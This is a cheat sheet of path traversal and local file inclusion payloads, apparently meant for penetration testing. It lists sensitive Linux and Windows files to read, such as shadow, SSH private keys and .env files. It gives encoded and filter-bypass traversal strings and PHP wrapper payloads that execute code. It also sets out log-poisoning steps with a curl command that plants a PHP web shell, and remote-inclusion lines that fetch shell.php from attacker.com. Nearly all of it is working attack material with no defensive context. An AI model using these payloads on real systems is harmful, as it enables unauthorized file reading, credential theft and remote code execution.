# Path Traversal / LFI Payloads

---

## Target Files (Linux)

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/os-release
/etc/issue
/etc/crontab
/etc/sudoers
/etc/ssh/sshd_config
/home/[user]/.ssh/id_rsa
/home/[user]/.ssh/authorized_keys
/home/[user]/.bash_history
/proc/self/environ          ← environment variables (may contain secrets)
/proc/self/cmdline
/proc/self/fd/0
/proc/net/tcp               ← active connections
/var/log/apache2/access.log ← log poisoning
/var/log/nginx/access.log
/var/www/html/index.php
/var/www/html/.env
/var/www/html/config.php
/var/www/html/wp-config.php
/app/config/database.yml
/app/.env
```

## Target Files (Windows)

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\repair\sam
C:\Windows\repair\system
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\index.asp
C:\Users\Administrator\Desktop\
C:\Users\[user]\.ssh\id_rsa
C:\ProgramData\MySQL\MySQL Server\my.ini
```

---

## Basic Traversal Sequences

```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

---

## Encoding Bypasses

### URL Encoding
```
..%2F..%2F..%2Fetc%2Fpasswd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Double URL Encoding
```
..%252F..%252F..%252Fetc%252Fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Unicode / UTF-8
```
..%c0%af../etc/passwd       ← overlong UTF-8 encoding of /
..%ef%bc%8f../etc/passwd
..%c1%9c../etc/passwd
```

### Null Byte (PHP < 5.3.4)
```
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
../../../../etc/passwd\0
```

### Alternate Separators
```
..\..\..\windows\win.ini      ← backslash (Windows)
..%5c..%5c..%5cwindows%5cwin.ini
..%5C..%5C..%5Cwindows%5Cwin.ini
....//....//....//etc/passwd  ← double slash (some stripping bypasses)
..././..././..././etc/passwd  ← mixed bypass
```

### Strip Bypass (when ../ is removed once)
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\\.....\\....\\etc\\passwd
```

---

## Absolute Path Bypass

When traversal is blocked but absolute paths work:
```
/etc/passwd
/etc/shadow
file:///etc/passwd
```

---

## PHP-Specific LFI

### PHP Wrappers
```php
# Read PHP source (base64 encoded)
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/read=string.rot13/resource=index.php

# Execute code via data wrapper (if allow_url_include=On)
php://input         ← with POST body: <?php system('id'); ?>
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Zip wrapper (if you can upload a zip)
zip://uploaded.zip#shell.php
phar://uploaded.phar/shell.php

# Expect wrapper (if installed)
expect://id
```

### Log Poisoning → RCE

1. Find an injectable log file (User-Agent or Referer header)
2. Poison the log with PHP code
3. Include the log file via LFI

```bash
# Step 1: Poison Apache access log via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include the log and trigger code
http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=id
```

Common log paths:
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log          ← poison via SSH login attempts
/proc/self/fd/2            ← stderr
/var/mail/[username]       ← email logs
```

### Session File Inclusion
```php
# PHP session files are typically in /tmp/sess_[sessionid]
# Poison via session variable, then include:
/tmp/sess_abc123def456
/var/lib/php/sessions/sess_abc123
/var/lib/php5/sessions/sess_abc123
```

---

## RFI (Remote File Inclusion)

Only works if `allow_url_include=On` (rare but check).

```
http://target.com/page.php?file=http://attacker.com/shell.php
http://target.com/page.php?file=ftp://attacker.com/shell.txt
http://target.com/page.php?file=\\attacker.com\share\shell.php
```
